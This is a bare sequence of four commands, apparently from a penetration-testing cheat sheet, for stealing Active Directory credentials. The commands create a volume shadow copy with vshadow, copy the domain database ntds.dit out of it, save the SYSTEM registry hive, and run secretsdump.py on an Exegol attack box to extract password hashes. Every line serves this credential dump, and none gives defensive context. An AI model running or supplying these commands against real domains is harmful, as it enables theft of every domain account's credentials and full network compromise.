```powershell
vshadow.exe -nw -p  C:
```

```powershell
copy \\?\GLOBALROOT\Device\$DEVICE_NAME\windows\ntds\ntds.dit c:\ntds.dit.bak # $DEVICE_NAME can be find as "Shadow copy device name" in the previous command result
```

```powershell
reg.exe save hklm\system c:\system.bak
```

```shell
secretsdump.py -ntds ntds.dit.bak -system system.bak LOCAL # On exegol
```
